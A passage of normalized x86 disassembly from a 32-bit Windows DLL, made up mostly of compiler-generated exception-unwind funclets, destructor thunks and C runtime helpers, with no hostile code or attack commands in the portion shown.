push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10047916
add esp 0x10
pop ebp
retn
sub_10047a79
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_100479b0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10047ac4
call eax
retn
sub_10047ac7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_10047e79
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10047d47
add esp 0x10
pop ebp
retn
sub_1004814c
push 0x2
call sub_1003edd7
sub_10048425
push 0x1
call sub_1004842e
pop ecx
retn
sub_100484d6
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10046099
pop ecx
pop ecx
retn
sub_10048509
push 0x1
call sub_10045173
pop ecx
retn
sub_10048520
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10048ab0
sub_10048536
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10048ab0
sub_100487b1
push 0x1
call sub_10045173
pop ecx
retn
sub_1004883f
push 0xa
call sub_10045173
pop ecx
retn
sub_10048a50
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004895b
add esp 0x10
pop ebp
retn
sub_1004ac45
push edi
call sub_10048935
pop ecx
retn
sub_1004ad41
push esi
call sub_1004605f
pop ecx
retn
sub_1004ad49
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1004ad60
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1004b012
push esi
call sub_10048935
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
sub_1004b210
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_1004b229
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b250
mov ecx [ ebp - 0x10 ]
jmp sub_10001150
sub_1004b258
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b280
mov ecx [ ebp - 0x10 ]
jmp sub_10001150
sub_1004b288
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b2b0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_1004b2c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b2f0
mov ecx [ ebp - 0x10 ]
jmp sub_10001320
sub_1004b2f8
mov ecx [ ebp - 0x10 ]
jmp sub_10001150
sub_1004b300
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b320
mov ecx [ ebp - 0x10 ]
jmp sub_10002490
sub_1004b328
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b350
mov eax [ ebp - 0x14 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b35b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b380
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_10001140
add esp 0x8
retn
sub_1004b391
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b3b0
mov ecx rw-data
jmp sub_10001150
sub_1004b3ba
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b3e0
mov ecx rw-data
jmp sub_10001150
sub_1004b3ea
mov ecx rw-data
jmp sub_10001320
sub_1004b3f4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b410
mov ecx rw-data
jmp sub_10001150
sub_1004b41a
mov ecx rw-data
jmp sub_10001320
sub_1004b424
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b440
mov ecx rw-data
jmp sub_10001320
sub_1004b44a
mov ecx rw-data
jmp sub_10001150
sub_1004b454
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b470
mov ecx rw-data
jmp sub_10001320
sub_1004b47a
mov ecx rw-data
jmp sub_10001150
sub_1004b484
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b4a0
mov ecx [ ebp + 0x8 ]
add ecx 0x10
jmp sub_10001880
sub_1004b4ab
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10001ef0
sub_1004b4c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b4e0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_10001880
sub_1004b4eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b510
mov ecx [ ebp - 0x38 ]
jmp sub_10001e10
sub_1004b518
mov ecx [ ebp - 0x38 ]
add ecx 0xc
jmp sub_100036b0
sub_1004b523
mov ecx [ ebp - 0x38 ]
add ecx 0x28
jmp sub_100036e0
sub_1004b52e
mov ecx [ ebp - 0x38 ]
add ecx 0x34
jmp sub_100036e0
sub_1004b539
mov ecx [ ebp - 0x38 ]
add ecx 0x40
jmp sub_100036e0
sub_1004b544
mov ecx [ ebp - 0x38 ]
add ecx 0x4c
jmp sub_100036e0
sub_1004b54f
mov ecx [ ebp - 0x38 ]
add ecx 0x58
jmp sub_1003b620
sub_1004b55a
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_1004b562
lea ecx [ ebp - 0x2c ]
jmp sub_100036b0
sub_1004b56a
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b575
mov ecx [ ebp - 0x34 ]
jmp sub_1002ba70
sub_1004b57d
mov ecx [ ebp - 0x34 ]
add ecx 0x8
jmp sub_1003b620
sub_1004b588
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b593
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b59e
mov ecx [ ebp - 0x34 ]
jmp sub_10006660
sub_1004b5a6
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b5b1
mov ecx [ ebp - 0x34 ]
jmp sub_10006660
sub_1004b5b9
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b5c4
mov ecx [ ebp - 0x34 ]
jmp sub_10006660
sub_1004b5cc
mov eax [ ebp - 0x34 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b5d7
mov ecx [ ebp - 0x34 ]
jmp sub_10006660
sub_1004b5df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b610
lea ecx [ ebp - 0x20 ]
jmp sub_1003b620
sub_1004b618
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b640
mov ecx [ ebp - 0x10 ]
jmp sub_10001e10
sub_1004b648
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100036b0
sub_1004b653
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp sub_100036e0
sub_1004b65e
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_100036e0
sub_1004b669
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_100036e0
sub_1004b674
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_100036e0
sub_1004b67f
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp sub_1003b620
sub_1004b68a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b6b0
mov eax [ ebp + 0xc ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b6bb
mov ecx [ ebp - 0x10 ]
jmp sub_100036b0
sub_1004b6c3
mov eax [ ebp + 0xc ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b6ce
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b6f0
lea ecx [ ebp - 0x20 ]
jmp sub_1003b620
sub_1004b6f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b720
lea ecx [ ebp - 0x28 ]
jmp sub_100036e0
sub_1004b728
mov eax [ ebp - 0x30 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b733
mov ecx [ ebp - 0x2c ]
jmp sub_100036e0
sub_1004b73b
lea ecx [ ebp - 0x28 ]
jmp sub_100036e0
sub_1004b743
mov eax [ ebp - 0x2c ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b74e
mov ecx [ ebp - 0x30 ]
jmp sub_100036e0
sub_1004b756
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b780
lea ecx [ ebp - 0x84 ]
jmp sub_1003b620
sub_1004b78b
lea ecx [ ebp - 0x3c ]
jmp sub_10001ef0
sub_1004b793
mov eax [ ebp - 0x88 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b7a1
mov ecx [ ebp - 0x58 ]
jmp sub_100036b0
sub_1004b7a9
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_1004b7b1
mov eax [ ebp - 0x58 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b7bc
mov ecx [ ebp - 0x58 ]
jmp sub_100191d0
sub_1004b7c4
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_1004b7cc
lea ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_1004b7d4
lea ecx [ ebp - 0x74 ]
jmp sub_1003b620
sub_1004b7dc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b810
lea ecx [ ebp - 0x24 ]
jmp sub_1003b620
sub_1004b818
lea ecx [ ebp - 0x24 ]
jmp sub_1003b620
sub_1004b820
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b840
mov eax [ ebp - 0x1c ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004b84b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b870
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_1004b881
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b8a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b8c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b8e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b900
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_10001140
add esp 0x8
retn
sub_1004b911
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b930
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_1004b941
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b960
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b980
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call sub_10001140
add esp 0x8
retn
sub_1004b991
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004b9b0
mov ecx [ ebp - 0x10 ]
jmp sub_10004280
sub_1004b9b8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001880
sub_1004b9c3
mov ecx [ ebp - 0x10 ]
jmp sub_10004430
sub_1004b9cb
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10001880
sub_1004b9d6
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_10004970
sub_1004b9e1
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_10004970
sub_1004b9ec
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_10004970
sub_1004b9f7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004ba20
mov ecx [ ebp - 0x10 ]
jmp sub_10004280
sub_1004ba28
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001880
sub_1004ba33
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004ba50
mov ecx [ ebp - 0x10 ]
jmp sub_10004430
sub_1004ba58
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10001880
sub_1004ba63
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_10004970
sub_1004ba6e
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_10004970
sub_1004ba79
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_10004970
sub_1004ba84
mov ecx [ ebp - 0x10 ]
jmp sub_10004280
sub_1004ba8c
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001880
sub_1004ba97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bac0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_100047b0
sub_1004bad9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bb00
mov ecx [ ebp - 0x10 ]
jmp sub_10001880
sub_1004bb08
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10004970
sub_1004bb13
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_10004970
sub_1004bb1e
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_10004970
sub_1004bb29
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bb50
mov ecx [ ebp - 0x10 ]
jmp sub_10001880
sub_1004bb58
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10004970
sub_1004bb63
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_10004970
sub_1004bb6e
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_10004970
sub_1004bb79
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bba0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bbc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bbe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bc00
mov eax [ ebp - 0x10 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004bc0b
mov ecx [ ebp - 0x14 ]
jmp sub_100047b0
sub_1004bc13
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bc30
mov eax [ ebp - 0x50 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x50 ] 0xfffffffe
mov ecx [ ebp - 0x54 ]
jmp sub_10001880
sub_1004bc49
lea ecx [ ebp - 0x4c ]
jmp sub_100047b0
sub_1004bc51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bc80
mov ecx [ ebp - 0x10 ]
jmp sub_10004530
sub_1004bc88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bcb0
mov eax [ ebp - 0x528 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x528 ] 0xfffffffe
mov ecx [ ebp - 0x52c ]
jmp sub_10001880
sub_1004bcd2
lea ecx [ ebp - 0x51c ]
jmp sub_100047b0
sub_1004bcdd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x530 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bd10
mov eax [ ebp - 0x58 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x58 ] 0xfffffffe
mov ecx [ ebp - 0x5c ]
jmp sub_10001880
sub_1004bd29
lea ecx [ ebp - 0x4c ]
jmp sub_100047b0
sub_1004bd31
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bd60
lea ecx [ ebp + 0x20 ]
jmp sub_100036b0
sub_1004bd68
lea ecx [ ebp + 0x8 ]
jmp sub_100036b0
sub_1004bd70
mov ecx [ ebp - 0x14 ]
jmp sub_10004280
sub_1004bd78
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_10001880
sub_1004bd83
mov ecx [ ebp - 0x14 ]
jmp sub_10004430
sub_1004bd8b
mov ecx [ ebp - 0x14 ]
add ecx 0x1c
jmp sub_100036b0
sub_1004bd96
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bdc0
mov ecx [ ebp - 0x10 ]
jmp sub_10004430
sub_1004bdc8
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100036b0
sub_1004bdd3
mov ecx [ ebp - 0x10 ]
jmp sub_10004280
sub_1004bddb
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_10001880
sub_1004bde6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004be10
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x30 ]
jmp sub_10001880
sub_1004be29
mov ecx [ ebp - 0x34 ]
jmp sub_100036b0
sub_1004be31
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004be39
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004be60
mov eax [ ebp - 0x10 ]
push eax
call j_sub_1003f3e3#2
pop ecx
retn
sub_1004be6b
mov ecx [ ebp - 0x14 ]
jmp sub_100036b0
sub_1004be73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004be90
mov ecx [ ebp - 0x10 ]
jmp sub_10005ea0
sub_1004be98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bec0
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_10001880
sub_1004bed9
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004bee1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bf10
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_1004bf18
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004bf20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bf50
lea ecx [ ebp + 0xc ]
jmp sub_10001880
sub_1004bf58
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_10001880
sub_1004bf71
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004bf79
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bfa0
lea ecx [ ebp + 0xc ]
jmp sub_10001880
sub_1004bfa8
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_1004bfc1
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004bfc9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004bff0
mov ecx [ ebp - 0x10 ]
jmp sub_10006660
sub_1004bff8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c020
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_1004c028
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c050
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_10001880
sub_1004c069
lea ecx [ ebp - 0x28 ]
jmp sub_10001880
sub_1004c071
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1003c623
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c0a0
mov ecx [ ebp - 0x10 ]
jmp sub_10005ea0
sub_1004c0a8
mov ecx [ ebp - 0x10 ]
jmp sub_10005f80
sub_1004c0b0
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10001880
sub_1004c0bb
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_10001880
sub_1004c0c6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c0f0
mov ecx [ ebp - 0x10 ]
jmp sub_10005f80
sub_1004c0f8
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10001880
sub_1004c103
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_10001880
sub_1004c10e
mov ecx [ ebp - 0x10 ]
jmp sub_10005ea0
sub_1004c116
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c140
lea ecx [ ebp + 0x8 ]
jmp sub_10001880
sub_1004c148
mov ecx [ ebp - 0x14 ]
jmp sub_10001880
sub_1004c150
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1003c623
mov eax r--data
jmp sub_1003e7aa
sub_1004c170
lea ecx [ ebp + 0xc ]
jmp sub_10001880
sub_1004c178
mov ecx [ ebp - 0x2c ]
jmp sub_10001880
sub_1004c180
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10001880
sub_1004c199
mov ecx [ ebp - 0x2c ]
